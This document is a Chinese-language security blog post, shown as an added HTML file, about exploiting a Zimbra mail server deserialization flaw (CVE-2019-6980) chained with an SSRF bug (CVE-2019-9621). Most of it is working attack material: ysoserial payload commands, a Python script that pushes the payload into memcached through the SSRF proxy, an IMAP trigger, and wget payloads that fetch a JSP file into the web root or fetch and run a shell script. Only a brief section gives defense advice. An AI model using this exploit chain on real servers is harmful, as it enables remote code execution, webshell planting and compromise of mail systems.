@@ -1,0 +1,298 @@
+I"Q3<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>Zimbra反序列化漏洞(CVE-2019-6980)适用于8.7.x至8.8.11的Zimbra邮件服务器，是一个远程代码执行漏洞。</p>
+
+<p>考虑到距补丁公开日期已经超过两年，并且没有一个完整的可用POC，所以本文将要在技术研究的角度记录测试过程，开源利用脚本，分享细节。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>本地漏洞复现</li>
+  <li>实际利用分析</li>
+  <li>开源利用脚本</li>
+  <li>防御建议</li>
+</ul>
+
+<h2 id="0x02-本地漏洞复现">0x02 本地漏洞复现</h2>
+<hr />
+
+<p>参考资料：</p>
+
+<p>https://blog.tint0.com/2019/03/a-saga-of-code-executions-on-zimbra.html</p>
+
+<p>https://blog.csdn.net/fnmsd/article/details/89235589?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=1328603.11954.16149289993579653&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control</p>
+
+<h4 id="1搭建环境">(1)搭建环境</h4>
+
+<p>挑选符合漏洞版本的Zimbra邮件服务器，下载地址：</p>
+
+<p>https://www.zimbra.com/downloads/zimbra-collaboration-open-source/archives/</p>
+
+<p>具体搭建过程可参考其他资料</p>
+
+<h4 id="2创建用户">(2)创建用户</h4>
+
+<p>创建一个测试用户test1，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/zmprov ca test1@test.zimbra.com Password123 displayName
+</code></pre></div></div>
+
+<p>结果返回测试用户test1对应的zimbraId，格式为<code class="language-plaintext highlighter-rouge">11111111-1111-1111-1111-111111111111</code></p>
+
+<p><strong>补充：其它常用命令</strong></p>
+
+<p>参考资料：https://wiki.zimbra.com/wiki/Zmprov</p>
+
+<p>列出所有用户：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/zmprov -l gaa
+</code></pre></div></div>
+
+<p>列出所有管理员用户：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/zmprov gaaa
+</code></pre></div></div>
+
+<p>查看用户test1对应的zimbraId：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/zmprov ga test1 zimbraId
+</code></pre></div></div>
+
+<h4 id="3修改服务器配置">(3)修改服务器配置</h4>
+
+<p>列出所有服务器：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/zmprov gad
+</code></pre></div></div>
+
+<p>得到服务器名称<code class="language-plaintext highlighter-rouge">test.zimbra.com</code></p>
+
+<p>查看配置信息zimbraMemcachedClientServerList：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/zmprov gs test.zimbra.com zimbraMemcachedClientServerList
+</code></pre></div></div>
+
+<p>默认返回结果为空</p>
+
+<p>设置zimbraMemcachedClientServerList的值为127.0.0.1：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/zmprov ms test.zimbra.com zimbraMemcachedClientServerList 127.0.0.1
+</code></pre></div></div>
+
+<h4 id="4重启zimbra">(4)重启Zimbra</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/zmcontrol restart
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>首次修改zimbraMemcachedClientServerList需要重启Zimbra</p>
+
+<p>如果非首次修改zimbraMemcachedClientServerList，在设置后执行ReloadMemcachedClientConfig命令即可：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/zimbra/bin/zmprov rmcc all
+</code></pre></div></div>
+
+<h4 id="5生成payload">(5)生成Payload</h4>
+
+<p>这里需要使用<a href="https://github.com/frohoff/ysoserial/">ysoserial</a></p>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ysoserial.jar MozillaRhino2 "/bin/touch /tmp/test12345" &gt; test.obj
+</code></pre></div></div>
+
+<h4 id="6登录测试用户test1获得cookie">(6)登录测试用户test1，获得Cookie</h4>
+
+<p>通过浏览器登录测试用户test1，取出登录Cookie，信息如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0_8ef6794c8d0d991add9ebd717c09e7f7b69b8d76_69641d11161a19166611181165102d161411172d146218192d626611662d1516641717156217621062651b6578701d11111a111611111718161114121117161b76761d111a101b747970651d161a7a696d6272611b7469641d191a1211171011181914121b76657271696f6e1d11111a182e162e105f47415f111115111b617172661d111a111b;
+</code></pre></div></div>
+
+<h4 id="7发送payload">(7)发送Payload</h4>
+
+<p>这里需要使用Python2.7</p>
+
+<p><strong>注：</strong></p>
+
+<p>使用Python3需要考虑byte数组的类型转换</p>
+
+<p>Python2.7的代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+accountid = "11111111-1111-1111-1111-111111111111"
+folderNo= 2
+modseq = 1
+uidvalidity = 1
+cacheKey ="zmImap:{accountId}:{folderNo}:{modseq}:{uidvalidity}".format(accountId=accountid,folderNo=str(folderNo),modseq=str(modseq),uidvalidity=str(uidvalidity))
+print(cacheKey)
+with open(r"test.obj","rb") as f:
+    payload = f.read()
+
+set_command = b"set {cacheKey} 2048 3600 {payloadsize}\r\n".format(cacheKey=cacheKey,payloadsize=str(len(payload)))+payload+"\r\n"
+
+headers = {
+    "Cookie":"ZM_ADMIN_AUTH_TOKEN=0_8ef6794c8d0d991add9ebd717c09e7f7b69b8d76_69641d11161a19166611181165102d161411172d146218192d626611662d1516641717156217621062651b6578701d11111a111611111718161114121117161b76761d111a101b747970651d161a7a696d6272611b7469641d191a1211171011181914121b76657271696f6e1d11111a182e162e105f47415f111115111b617172661d111a111b",
+    "host":"foo:7071"
+}
+r = requests.post("https://192.168.1.1/service/proxy?target=http://127.0.0.1:11211",data=set_command,headers=headers,verify=False)
+print r.text
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>以上代码修改自<a href="https://blog.csdn.net/fnmsd/article/details/89235589?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=1328603.11954.16149289993579653&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">《Zimbra SSRF+Memcached+反序列化漏洞利用复现》</a></p>
+
+<p>参数说明：</p>
+
+<ul>
+  <li>accountid: 对应zimbraId</li>
+  <li>folderNo: 2代表收件箱</li>
+  <li>modseq: 对于新用户，默认为1</li>
+  <li>uidvalidity: 对于新用户，默认为1</li>
+</ul>
+
+<p>代码细节：</p>
+
+<p>这里需要添加Cookie信息，填入普通用户登录后的token，名称设置为<code class="language-plaintext highlighter-rouge">ZM_ADMIN_AUTH_TOKEN</code>，请求的地址为<code class="language-plaintext highlighter-rouge">https://192.168.1.1/service/proxy?target=http://127.0.0.1:11211</code>，这是为了使用SSRF(CVE-2019-9621)漏洞将数据最终发送到11211端口</p>
+
+<p>通常Zimbra不会对外开放11211端口，但是如果开放，可以将上面的代码修改为直接访问11211端口，不再需要借助SSRF(CVE-2019-9621)漏洞</p>
+
+<h4 id="8触发反序列化执行代码">(8)触发反序列化，执行代码</h4>
+
+<p>通过nc使用imap-ssl协议登录测试用户test1，访问收件箱，触发漏洞</p>
+
+<p>命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ncat --ssl 192.168.1.1 993
+a001 login test1@test.zimbra.com Password123
+a001 select inbox
+</code></pre></div></div>
+
+<h2 id="0x03-实际利用分析">0x03 实际利用分析</h2>
+<hr />
+
+<h3 id="1适用条件">1.适用条件</h3>
+
+<p>可分为以下两种情况：</p>
+
+<h4 id="1zimbra服务器版本为87x至8811">(1)Zimbra服务器版本为8.7.x至8.8.11</h4>
+
+<p>能够访问imap-ssl端口(默认为993)</p>
+
+<p>存在SSRF(CVE-2019-9621)漏洞</p>
+
+<p>如果服务器未设置过zimbraMemcachedClientServerList，需要通过SSRF(CVE-2019-9621)漏洞设置为127.0.0.1并等待Zimbra重启</p>
+
+<h4 id="2zimbra服务器版本为87x至8811">(2)Zimbra服务器版本为8.7.x至8.8.11</h4>
+
+<p>需要能够访问imap-ssl端口(默认为993)</p>
+
+<p>不存在SSRF(CVE-2019-9621)漏洞</p>
+
+<p>需要获得一个用户凭据(明文口令)</p>
+
+<p>需要能够访问11211端口</p>
+
+<p>zimbraMemcachedClientServerList的值需要设置为127.0.0.1</p>
+
+<p>第二种情况过于苛刻，通常为第一种情况， 所以接下来介绍配合SSRF(CVE-2019-9621)漏洞的利用方法</p>
+
+<h3 id="2利用流程">2.利用流程</h3>
+
+<p>SSRF(CVE-2019-9621)漏洞的利用可使用之前开源的脚本<a href="https://github.com/3gstudent/Homework-of-Python/blob/master/Zimbra_SOAP_API_Manage.py">Zimbra_SOAP_API_Manage.py</a></p>
+
+<h4 id="1创建用户">(1)创建用户</h4>
+
+<p>使用命令CreateAccountSSRF，创建新的用户</p>
+
+<h4 id="2查看配置">(2)查看配置</h4>
+
+<p>使用命令GetMemcachedClientConfigSSRF获得zimbraMemcachedClientServerList，如果结果不是127.0.0.1，需要重新设置</p>
+
+<h4 id="3设置zimbramemcachedclientserverlist">(3)设置zimbraMemcachedClientServerList</h4>
+
+<p>使用命令GetServerSSRF获得ServerID，用作参数</p>
+
+<p>使用命令ModifyServerSSRF修改配置，名称为zimbraMemcachedClientServerList，值为127.0.0.1</p>
+
+<h4 id="4重新加载">(4)重新加载</h4>
+
+<p>使用命令ReloadMemcachedClientConfigSSRF，使得修改生效</p>
+
+<h4 id="5生成payload-1">(5)生成Payload</h4>
+
+<p>使用<a href="https://github.com/frohoff/ysoserial/">ysoserial</a>中的MozillaRhino2功能</p>
+
+<p>MozillaRhino2在代码实现上通过exec()方法实现执行Linux命令，这里需要注意exec()方法无法执行带有特殊字符的命令，例如<code class="language-plaintext highlighter-rouge">|</code> <code class="language-plaintext highlighter-rouge">&gt;</code></p>
+
+<p>也就说是，无法通过特殊字符<code class="language-plaintext highlighter-rouge">&gt;</code>实现文件写入操作</p>
+
+<p>这里可以换用wget命令实现</p>
+
+<p>命令示例1：直接下载jsp文件</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ysoserial.jar MozillaRhino2 "/usr/bin/wget https://192.168.1.1/test.jsp --no-check-certificate -O /opt/zimbra/jetty/webapps/zimbra/public/test.jsp" &gt; payload.obj
+</code></pre></div></div>
+
+<p>命令示例2：下载sh脚本，然后去执行</p>
+
+<p>test.sh的内容如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh
+PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/git/bin:/usr/local/sbin:~/bin
+echo $PWD &gt;/tmp/test
+</code></pre></div></div>
+
+<p>生成Payload的命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ysoserial.jar MozillaRhino2 "/usr/bin/wget https://192.168.1.1/test.sh --no-check-certificate -O /tmp/test.sh" &gt; payload.obj
+
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ysoserial.jar MozillaRhino2 "/bin/sh /tmp/test.sh" &gt; payload.obj
+</code></pre></div></div>
+
+<h4 id="6执行脚本zimbra_deserialization_rcecve-2019-6980py">(6)执行脚本Zimbra_deserialization_RCE(CVE-2019-6980).py</h4>
+
+<p>Zimbra_deserialization_RCE(CVE-2019-6980).py自动实现以下操作：</p>
+
+<ul>
+  <li>登录用户，获得Cookie</li>
+  <li>通过GetAccountInfoRequest获得用户对应的zimbraId</li>
+  <li>通过SSRF(CVE-2019-9621)漏洞向11211端口发送Payload</li>
+  <li>使用imap-ssl协议登录用户，访问收件箱，触发反序列化漏洞，执行代码</li>
+</ul>
+
+<p>代码已上传至github，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-Python/blob/master/Zimbra_deserialization_RCE(CVE-2019-6980).py</p>
+
+<p>这里需要注意，Python使用imaplib实现imap-ssl协议时，能够获得uidvalidity的值，但无法获得modseq的值</p>
+
+<h2 id="0x04-防御建议">0x04 防御建议</h2>
+<hr />
+
+<p>升级版本，安装补丁</p>
+
+<p>禁止从外部访问11211端口</p>
+
+<p>禁止从外部访问7071端口</p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文介绍了Zimbra反序列化漏洞(CVE-2019-6980)的测试过程，开源利用脚本Zimbra_deserialization_RCE(CVE-2019-6980).py，分享细节。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
